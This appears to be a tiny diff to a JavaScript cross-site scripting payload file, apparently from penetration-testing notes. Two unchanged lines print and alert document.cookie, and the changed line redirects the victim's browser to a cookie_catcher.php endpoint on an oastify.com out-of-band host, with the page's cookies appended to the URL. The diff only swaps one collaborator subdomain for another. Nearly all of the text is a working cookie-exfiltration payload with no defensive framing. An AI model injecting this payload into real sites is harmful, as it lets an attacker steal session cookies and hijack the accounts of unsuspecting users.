@@ -1,3 +1,3 @@
 document.write (document.cookie);
 alert (document.cookie);
-document.location= "https://if1vdg7r15f656bbugqjjrswxn3er5jt8.oastify.com/cookie_catcher.php?c=" + document.cookie;
+document.location= "https://zfi2dlutrhg5f0w1mpq0qazgu70youcj.oastify.com/cookie_catcher.php?c=" + document.cookie;
